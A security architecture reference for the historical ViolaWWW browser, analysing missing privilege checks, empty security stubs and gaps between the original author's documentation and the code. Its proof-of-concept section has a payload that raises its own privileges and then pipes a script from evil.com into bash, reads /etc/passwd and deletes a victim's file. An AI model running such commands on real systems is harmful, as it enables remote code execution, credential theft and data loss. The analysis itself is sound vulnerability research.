# ViolaWWW Security Architecture Reference

> **Documentation created in: ViolaWWW 4.0**  
> This document describes the original security architecture from ViolaWWW v3.x (1992-1995). The security system is **incomplete and not fully functional** — see "Implementation Status" section.

This document provides a comprehensive analysis of ViolaWWW's security architecture, including design flaws and vulnerabilities. For detailed function signatures and parameters, see [VIOLA_FUNCTIONS.md](VIOLA_FUNCTIONS.md).

## Overview

ViolaWWW implements a rudimentary security system designed for the early 1990s web environment. The system relies on object-level security attributes rather than modern sandboxing techniques. While functional for its era, the implementation contains significant vulnerabilities that make it unsuitable for contemporary web security requirements.

## Core Security Model

### Security Levels

Each Viola object contains a `security` attribute that determines its access privileges:

- `security = 0`: **Trusted/Safe** - Full access to privileged operations
- `security > 0`: **Untrusted** - Restricted from dangerous operations

### Global Security Mode

The system maintains a global `securityMode` variable that affects newly created objects:

```c
long securityMode = 0;  // Global security mode
```

When `securityMode > 0`, all newly created objects receive `security = securityMode`.

## Security Enforcement

### Privilege Checking

Privileged operations check the caller's security level using the `notSecure()` function:

```c
int notSecure(VObj* self) {
    if (GET_security(self) > 0) {
        fprintf(stderr, "execution denied to object '%s' (security=%d)\n",
                GET_name(self), GET_security(self));
        return 1;  // Deny access
    }
    return 0;    // Allow access
}
```

### Protected Operations

The following operations require `security = 0`:

#### Core System Operations
- `exit()` - Terminate the application
- `quit()` - Exit ViolaWWW
- `destroy()` - Destroy objects
- `tweak()` - Execute code on other objects bypassing their scripts

#### File System Operations
- `loadFile()` - Read arbitrary files
- `deleteFile()` - Delete files
- `accessible()` - Check file accessibility

#### Network Operations
- `HTTPGet()`, `HTTPPost()`, `HTTPBuildDoc()` - Network requests
- `SGMLBuildDoc()` variants - Parse and render documents

#### Object Management
- `loadObjFile()` - Load Viola object files
- `interpret()` - Execute arbitrary code strings
- `save()`, `saveAs()` - Save objects to disk

#### System Interaction
- `environVar()` - Access environment variables
- `cli()` - Command line interface access

## Security Mode Management

### securityMode() Function

The `securityMode()` function controls global security policy:

```c
long meth_generic_securityMode(VObj* self, Packet* result, int argc, Packet argv[]) {
    if (securityMode == 0)  // Only changeable when currently safe
        securityMode = PkInfo2Int(&argv[1]);

    result->info.i = securityMode;
    return 1;
}
```

**Critical Limitation**: Once `securityMode` becomes non-zero, it cannot be reset to zero.

### Author's Official Documentation

From [Methods/TO_WRITE](https://web.archive.org/web/20041113225255/http://www.xcf.berkeley.edu/~wei/viola/book/methods/TO_WRITE):

> **securityMode(mode)**
>
> Returns: mode.  
> Scope: generic
>
> *"Forces security mode for newly created objects. All objects created during the time when mode > 0 will have the security value set to the mode value. **Can alter securityMode value only if mode == 0.**"*
>
> *"Can affect operation of `interpret()` and `tweak()`."*

This confirms the one-way trap was **intentional design**, not a bug. The author explicitly documented that `securityMode` can only be changed when it equals zero — once elevated, it's permanent for the session.

### Object Creation Security

Objects created from HTML content receive `security = 1` (untrusted) by default:

```c
SET_security(obj, 1); /* non secure */
```

However, the global `securityMode` can override this during object creation:

```c
if (securityMode > 0)
    SET_security(obj, securityMode);
```

## Content Loading Security

### HTML Processing

HTML content is processed through the SGML parser, creating objects based on tag mappings in `HTML_style.c`. Most HTML elements create untrusted objects with `security = 1`.

### VOBJF Elements

`<VOBJF>` tags enable loading external Viola object files (`.v` files):

```html
<vobjf href="object.v">Load external object</vobjf>
```

The loading process temporarily adjusts security:

```javascript
securityMode(1);  // Make loaded objects untrusted
send(objName, "init"); // Create objects
securityMode(0);  // Restore safe mode
```

## Identified Vulnerabilities

### Critical Security Flaws

#### 1. Security Attribute Modification

The `set("security", level)` operation lacks security checks:

```c
case STR_security:
    result->info.i = PkInfo2Int(&argv[1]);
    helper_setSecurity(self, result->info.i); // No notSecure() check!
```

**Impact**: Any untrusted object can elevate itself to `security = 0`.

#### 2. Unchecked Object File Loading

The `loadObjFile()` function lacks security validation:

```c
long meth_cosmic_loadObjFile(VObj* self, Packet* result, int argc, Packet argv[]) {
    // No notSecure() check!
    result->info.i = load_object(fname, path);
}
```

**Impact**: Untrusted objects can load arbitrary `.v` files containing malicious scripts.

#### 3. Irreversible Security Mode (Intentional Design Flaw)

Once `securityMode` becomes non-zero, it cannot be reset:

```c
if (securityMode == 0)  // One-way door
    securityMode = PkInfo2Int(&argv[1]);
```

The author documented this as intentional: *"Can alter securityMode value only if mode == 0"*

**Impact**: A single compromised page can permanently compromise the browser for the entire session. This was meant to be a security feature (preventing untrusted code from lowering security), but combined with other vulnerabilities it becomes a denial-of-service vector.

### Attack Scenarios

#### Basic Privilege Escalation

1. Load HTML containing `<vobjf href="malicious.v">`
2. `malicious.v` contains an object with script: `set("security", 0)`
3. Attacker gains full privileges

#### Persistent Compromise

1. Malicious content sets `securityMode(1)`
2. All future objects created with `security = 1`
3. Security mode cannot be reset to safe state

### Proof of Concept Attack Chain

A complete attack requires only three steps:

**Step 1**: Victim opens a page containing:
```html
<vobjf href="http://evil.com/payload.v">Click here</vobjf>
```

**Step 2**: `payload.v` contains:
```javascript
\class {generic}
\name {evil}
\script {
    // Privilege escalation - single line!
    set("security", 0);
    
    // Now we have full access:
    system("curl http://evil.com/shell.sh | bash");
    loadFile("/etc/passwd");
    deleteFile("/home/victim/important.doc");
    environVar("HOME");  // Read environment
}
```

**Step 3**: Attacker has complete control.

### Why These Attacks Work

| Vulnerability | Root Cause |
|--------------|------------|
| `set("security", 0)` works | No `notSecure()` check before `helper_setSecurity()` |
| `loadObjFile()` works | No `notSecure()` check in `meth_cosmic_loadObjFile()` |
| No confirmation dialogs | `wwwDialog_confirm` is empty, others don't exist |
| No caller authentication | Only comments, no implementation |

## HTML Tag Security

### Active Tags

Tags that create interactive objects:

- `<VOBJF>` - Loads external `.v` files
- `<FORM>`, `<INPUT>` - Form elements with event handling
- `<A>` - Links with navigation scripts

## Original Author's Documentation

Pei Yuan Wei wrote official documentation describing the security system. These archived pages reveal the **intended** design vs actual implementation:

**Source**: [ViolaWWW Book, Chapter 4.7 - Sub Interpreter and Security](https://web.archive.org/web/20030816230407/http://www.xcf.berkeley.edu/~wei/viola/book/chp4.html)

### Documented Security Behavior

> *"For certain applications the tweak() method can pose a security problem, so all objects have a 'security' attribute. The intention is to restrict the priviledges of objects deem untrusted. Such object might be the ones coming from document servers over the network."*

> *"If the 'security' attribute of an object is non zero, then the object can not execute the tweak() method **nor can it alter its own security status**."*

### Official List of Protected Methods

The documentation lists methods that should be blocked for untrusted objects:

> `accessible()`, `cli()`, `deleteFile()`, `destroy()`, `environVar()`, `exit()`, `interpret()`, `modalExit()`, `quit()`, `save()`, `saveAs()`, `HTTPGet()`, `HTTPGetNParse()`, `HTTPPost()`, `HTTPSubmit()`, `HTTPHotListAdd()`, `HTTPHotListDelete()`, `HTTPHotListGet()`, `HTTPHotListChange()`, `HTTPHotListLoad()`, `HTTPHotListSave()`, `loadFile()`, `loadSTG()`, `saveFile()`, `system()`, `tweak()`

### Documentation vs Implementation Gap

| Documented Behavior | Actual Implementation |
|--------------------|-----------------------|
| Object cannot alter its own security status | ❌ **No check** — `set("security", 0)` works |
| `loadObjFile()` protected | ❌ **Not in list** and no `notSecure()` check |
| `tweak()` blocked for untrusted | ✅ Has `notSecure()` check |
| Other listed methods blocked | ✅ Most have `notSecure()` checks |

### Critical Finding

The documentation explicitly states:

> *"nor can it alter its own security status"*

But the implementation in `cl_generic.c` has **no such check**:

```c
case STR_security:
    result->info.i = PkInfo2Int(&argv[1]);
    helper_setSecurity(self, result->info.i);  // No notSecure() check!
```

**Conclusion**: The documentation describes the **intended** security model, but the implementation is **incomplete**. This is the most critical vulnerability — the one feature that would have prevented privilege escalation was never implemented.

## Author's Public Statements (WWW-TALK Mailing List)

Pei Yuan Wei discussed ViolaWWW security publicly on the WWW-TALK mailing list in 1994. These archived messages reveal the evolution of his thinking:

### January 1994: Acknowledgment of Incomplete Security

**Source**: [WWW-TALK, Jan 28, 1994](https://ksi.cpsc.ucalgary.ca/archives/WWW-TALK/www-talk-1994q1.messages/357.html)

> *"Security could be better improved without giving up too much flexibility (currently every object has a security tagging, and all objects instantiated from foreign sources are marked as untrusted to system priviledges...)."*

**Key insight**: Wei explicitly acknowledged that security "could be better improved" — he knew the system was incomplete.

### September 1994: Public Claims About Security

**Source**: [WWW-TALK, Sep 27, 1994](https://ksi.cpsc.ucalgary.ca/archives/WWW-TALK/www-talk-1994q3/1100.html)

> *"The viola language system is 'object-oriented'... This makes it easy to enforce safety by a policy of marking imported objects as untrusted. As such, those imported objects' scripts have no system priviledges, no sub interpreters, can't coarse other objects to do things in a dangerous way..."*

### Claims vs Reality

| Wei's Public Claim | Actual Implementation |
|-------------------|----------------------|
| "imported objects marked as untrusted" | ✅ Yes — `SET_security(obj, 1)` in `sgml.c` |
| "no system priviledges" | ⚠️ Partial — most methods protected, but critical gaps exist |
| "no sub interpreters" | ✅ Yes — `interpret()` has `notSecure()` check |
| "can't coarse other objects to do things in a dangerous way" | ❌ **No** — `tweak()` is protected, but `set("security", 0)` bypasses everything |

### Timeline of Security Development

| Date | Event |
|------|-------|
| Jan 1994 | Wei admits security "could be better improved" |
| Sep 1994 | Wei publicly claims system is secure for untrusted applets |
| ~1995 | ViolaWWW development abandoned |
| 2026 | Code analysis reveals incomplete implementation |

The gap between Wei's September 1994 claims and the actual implementation suggests either:
1. The security improvements were planned but never completed
2. Wei was unaware of the `set("security")` bypass vulnerability
3. The vulnerability was introduced after his public statements

## Author's Own Acknowledgments

The original developer left explicit comments acknowledging the incomplete state of the security system:

### "Terribly Lay Back" Security Wall

In `wwwSecurity_script.v`:

```javascript
/* this security wall is terribly lay back now */
```

This comment directly admits the security implementation is inadequate.

### Missing Authentication

In the same file, when handling file operations:

```javascript
case "getDocAndMoveItToSpecifiedPlace":
    /* this is call by HTML__doc. Need a way to autheticate
     * that it's indeed HTML__doc that's calling ...
     */
    // No authentication implemented - just executes the command!
    system(concat("mv ", dumpFile, " ", arg[2]));
```

### Missing Confirmation Dialog

```javascript
if (access(arg[2])) {
    /* should query to confirm */
    print("Warning: overwriting ", arg[2], "...\n");
}
```

Instead of a confirmation dialog, only a console warning is printed.

### Incomplete Multi-Level Scheme

In `class.c`:

```c
/* is securityMode > 0 (unsure), then override original object's
 * security rating. note: this code is secure only for 2 levels scheme.
 */
```

The author explicitly notes uncertainty (`unsure`) and that the code only works for a two-level security scheme.

## Unimplemented Security Functions

### Empty Security Handlers in `mvw_script3.v`

Three security functions are defined with comments but contain no implementation:

```javascript
case "queryDocSecurity":
    /* for interface to get doc level security level */
break;  // Empty!

case "setSecurityClearence":
    /* coming from interace */
break;  // Empty!

case "querySecurityClearence":
    /* send to interface */
break;  // Empty!
```

These were intended to provide:
- **queryDocSecurity**: Query document security level
- **setSecurityClearence**: Set user clearance level
- **querySecurityClearence**: Check user clearance

None of these are implemented.

## Missing Security Dialogs

### Empty Confirmation Dialog

The `wwwDialog_confirm` object exists but is completely empty:

**File**: `embeds/wwwDialog_confirm_script.v`
```javascript
switch (arg[0]) {
case "confirm":
break;  // No implementation!
}
usual();
```

This dialog should:
- Display a message to the user
- Ask for Yes/No confirmation
- Return the result

Instead, it does nothing and returns nothing.

### Non-Existent Dialog Objects

The following dialogs are **called** in code but **do not exist**:

| Dialog | Purpose | Status |
|--------|---------|--------|
| `wwwDialog_confirm` | Yes/No confirmation | ⚠️ Empty stub |
| `wwwDialog_prompt_default` | Text input with default | ❌ Does not exist |
| `wwwDialog_prompt_password` | Password input | ❌ Does not exist |
| `wwwDialog_prompt_username_and_password` | Login dialog | ❌ Does not exist |

These are called from `www_script318.v`:

```javascript
case "dialog_confirm":
    return wwwDialog_confirm("confirm", arg[1]);  // Calls empty stub
case "dialog_prompt_default":
    return wwwDialog_prompt_default("prompt", arg[1], arg[2]);  // Object doesn't exist!
case "dialog_prompt_password":
    return wwwDialog_prompt_password("prompt", arg[1]);  // Object doesn't exist!
```

### Unused Ready-Made Dialog

A fully functional `res.dialogWithButtons` exists and is used for error messages, but is **not used** for security confirmations:

```javascript
// Used for author contact messages, but NOT for security:
res.dialogWithButtons("show", "The declared author contact is...", "Dismiss", "");
```

## The `<SECURITY>` Tag Ghost

### Defined in DTD

```c
// In HTMLDTD.c:
static attr security_attr[] = {{"LEVEL"}, {0}};
{"SECURITY", security_attr, HTML_SECURITY_ATTRIBUTES, SGML_EMPTY, 0, 0},
```

### Registered in Stylesheet

```
// In HTML_style.c:
SECURITY	HTML_security		1 0 0 0 0		0 0 0 0
```

### Object Does Not Exist

The `HTML_security` object is **never defined** in `objs.c`. When the parser encounters `<SECURITY LEVEL="1">`:

1. Parser looks for object `HTML_security`
2. Object not found
3. Tag is silently ignored

## Implementation Status

The security system is **fundamentally incomplete**:

### Implemented Features
- Basic object-level security attributes
- Privilege checking for core operations (partial)
- Global security mode
- HTML tag processing

### Partially Implemented
| Component | Status |
|-----------|--------|
| `notSecure()` function | ✅ Works |
| Protected operations list | ⚠️ Incomplete (missing checks) |
| `securityMode()` | ⚠️ One-way trap |
| `wwwSecurity` object | ⚠️ "Terribly lay back" |

### Not Implemented
| Component | Status |
|-----------|--------|
| `<SECURITY>` tag handler | ❌ Object missing |
| `queryDocSecurity()` | ❌ Empty stub |
| `setSecurityClearence()` | ❌ Empty stub |
| `querySecurityClearence()` | ❌ Empty stub |
| `wwwDialog_confirm` | ❌ Empty stub |
| `wwwDialog_prompt_*` | ❌ Objects missing |
| Caller authentication | ❌ Only comment |
| File overwrite confirmation | ❌ Only print() |

### Missing Security Checks

The following critical functions lack `notSecure()` checks:

```c
// loadObjFile - can load arbitrary .v files
long meth_cosmic_loadObjFile(VObj* self, ...) {
    // No notSecure(self) check!
    result->info.i = load_object(fname, path);
}

// set("security") - can elevate privileges
case STR_security:
    // No notSecure(self) check!
    helper_setSecurity(self, result->info.i);
```

### Dangerous Functions Marked by Author

In the author's method documentation, some functions carry explicit warnings:

#### `addPicFromFile()` — "USE WITH EXTREME CAUTION"

**Source**: [Methods/TO_WRITE](https://web.archive.org/web/20041113225255/http://www.xcf.berkeley.edu/~wei/viola/book/methods/TO_WRITE)

```c
// In cl_generic.c:
/* USE WITH EXTREME CAUTION. kludge for text-inlined images
 *
 * (obj)arg[0] 's __content us used to store pic list.
 * (char*)arg[1] is filepath of picture
 */
long meth_generic_addPicFromFile(VObj* self, ...) {
    // No notSecure() check!
    pic = tfed_addPicFromFile(&pics, fname, fname);
}
```

No security check — any script can add arbitrary files as images.

#### `HTTPGet()` — Temporary File Leakage

```c
long meth_generic_HTTPGet(VObj* self, ...) {
    if (self)
        if (notSecure(self))
            return 0;
    // ... downloads to temp file
}
```

From documentation:
> *"Retrieve a document pointed to by the URL, and saves the content in a temporary file. **It's user's responsibility to remove the temporary file after usage.**"*

Temporary files containing potentially sensitive content may persist on disk.

### Security Bypass via NULL Self

**Critical vulnerability in image loading**:

```c
// In glib_x.c - imgNodeRefInc():
ImgNode* imgNodeRefInc(char* id, char* filename) {
    // ...
    meth_generic_HTTPGet(NULL, &result, 1, &argv);  // NULL bypasses security!
}
```

When loading images (via `<IMG>` tag), the code calls `HTTPGet()` with `NULL` instead of `self`. This makes the check `if (self) if (notSecure(self))` always pass, **completely bypassing security** for all image fetches.

**Impact**: Any `<IMG SRC="file:///etc/passwd">` would work regardless of security level.

### Methods Documented as Non-Functional

The author's documentation explicitly marks these methods as broken:

| Method | Documentation Status |
|--------|---------------------|
| `loadSTG()` | "Not operational" |
| `STG()`, `STGInfo()` | "Not functional" |
| `modalExit()` | "NOT FUNCTIONAL" |
| `HTTPSubmit()` | "XXX NOT YET WORKING" (comment in code) |

### Missing Features
- Sandboxing for loaded content
- Content validation
- Secure script execution
- Network request filtering
- User confirmation dialogs
- Authentication mechanisms

## libWWW Security Flag

The libWWW library includes a separate security mechanism:

### HTSecure Flag

```c
// In HTAccess.c:
PUBLIC BOOL HTSecure = NO;     /* Disable access for telnet users? */
```

This flag is intended to restrict dangerous operations for telnet-connected users, but:

- **Disabled by default** (`NO`)
- Only affects telnet hopping prevention
- **Not connected** to Viola's object security system

```c
// In HTTelnet.c:
/* If the person is already telnetting etc, forbid hopping */
/* This is a security precaution, for us and remote site */
if (HTSecure) {
    // Block telnet hopping
}
```

This is a separate, limited security mechanism that does not integrate with the main Viola security model.

## Historical Context

ViolaWWW was developed in 1992-1994, predating modern web security concepts:

- **No sandboxing**: Content runs with full application privileges
- **Trust-based model**: Assumes benign content
- **Object-oriented security**: Novel approach for the era
- **Incomplete implementation**: Security features not fully developed
- **Abandoned before completion**: Project ended ~1994-1995

## Modern Security Comparison

### Feature Comparison

| Security Mechanism | ViolaWWW (1992) | Modern Browsers |
|-------------------|-----------------|-----------------|
| Sandboxing | ❌ None | ✅ Separate processes |
| Same-origin policy | ❌ None | ✅ Strict isolation |
| Content Security Policy | ❌ None | ✅ Script restrictions |
| Permission system | ❌ Object attribute only | ✅ Explicit user grants |
| File system access | 🔓 Full access | ✅ Isolated/sandboxed |
| Privilege checks | ⚠️ Bypassable | ✅ Cryptographic |
| Confirmation dialogs | ❌ Not implemented | ✅ Required for sensitive ops |
| Script execution | 🔓 Full privileges | ✅ Restricted context |

### Architectural Differences

**ViolaWWW (1992)**:
- Single-process architecture
- Trust-based model (content assumed benign)
- Object-level security attributes
- Security checks at function level (incomplete)

**Modern Browsers (2020s)**:
- Multi-process architecture (renderer, GPU, network isolated)
- Zero-trust model (all content potentially hostile)
- Capability-based permissions
- Hardware-enforced isolation (Site Isolation)

ViolaWWW's security model is fundamentally incompatible with modern web security requirements.

## Recommendations

For educational/research purposes only:

1. **Never expose ViolaWWW to untrusted content**
2. **Avoid loading external `.v` files**
3. **Consider the system as having no security boundaries**
4. **Use in isolated environments only**

## External References

### Original Documentation by Pei Yuan Wei

- [Chapter 4.7 - Sub Interpreter and Security](https://web.archive.org/web/20030816230407/http://www.xcf.berkeley.edu/~wei/viola/book/chp4.html) - Describes security model and protected methods
- [Chapter 13 - Applets](https://web.archive.org/web/20031207205546/http://www.xcf.berkeley.edu/~wei/viola/book/chp13.html) - ViolaWWW applet security (referenced in Chapter 4)
- [Methods/TO_WRITE](https://web.archive.org/web/20041113225255/http://www.xcf.berkeley.edu/~wei/viola/book/methods/TO_WRITE) - Method documentation with security warnings ("USE WITH EXTREME CAUTION", "NOT FUNCTIONAL")

### WWW-TALK Mailing List Archives (1994)

- [Jan 28, 1994 - Universal network graphics language](https://ksi.cpsc.ucalgary.ca/archives/WWW-TALK/www-talk-1994q1.messages/357.html) - Wei admits security "could be better improved"
- [Sep 27, 1994 - Forms support in clients](https://ksi.cpsc.ucalgary.ca/archives/WWW-TALK/www-talk-1994q3/1100.html) - Wei claims imported objects are secure

These primary sources show the evolution of Wei's thinking about security and the gap between public claims and implementation.

## Source Code References

Key files for security implementation:

| File | Purpose |
|------|---------|
| `src/viola/cl_cosmic.c` | `notSecure()` function, `loadObjFile()` |
| `src/viola/cl_generic.c` | `set("security")`, `securityMode()`, `helper_setSecurity()`, `addPicFromFile()` |
| `src/viola/class.c` | Security inheritance during clone/create |
| `src/viola/sgml.c` | `SET_security(obj, 1)` for HTML objects |
| `src/viola/obj.c` | Global `securityMode` variable |
| `src/viola/glib_x.c` | `imgNodeRefInc()` — security bypass via `NULL` self |
| `src/viola/embeds/wwwSecurity_script.v` | Security wall object (incomplete) |
| `src/viola/embeds/mvw_script3.v` | Empty security handlers |
| `src/viola/embeds/wwwDialog_confirm_script.v` | Empty confirmation dialog |
| `src/libWWW/HTMLDTD.c` | `<SECURITY>` tag definition |
| `src/viola/HTML_style.c` | `HTML_security` object mapping (missing) |

## Conclusion

ViolaWWW's security architecture represents an early attempt at web security but suffers from critical design flaws and **fundamentally incomplete implementation**. 

### What Was Planned

The original documentation reveals an ambitious security system design:

- **Self-modification protection**: Objects should not be able to alter their own security status (documented but **not implemented**)
- **Protected methods list**: 26+ methods blocked for untrusted objects (mostly implemented)
- Document-level security levels (`<SECURITY LEVEL=...>`)
- User clearance system (`setSecurityClearence`, `querySecurityClearence`)
- Confirmation dialogs for dangerous operations
- Caller authentication for privileged operations
- Multi-level security scheme

### What Was Built

Only a skeleton was implemented:
- Basic `security` attribute on objects
- `notSecure()` check function (but not universally applied)
- `securityMode` global (with one-way trap bug)
- Empty stubs for security functions
- Comments describing intended functionality

### The Reality

The system provides **illusory protection**:
- Any object can elevate itself to `security = 0` with one line of code
- Critical functions lack security checks
- All confirmation dialogs are empty or missing
- No authentication mechanisms exist

The author's own comment summarizes it best:

> *"this security wall is terribly lay back now"*
> — `wwwSecurity_script.v`

ViolaWWW was abandoned around 1994-1995 when Netscape and Internet Explorer dominated the market. The security system was never completed. For modern use, **treat ViolaWWW as having no security boundaries whatsoever**.
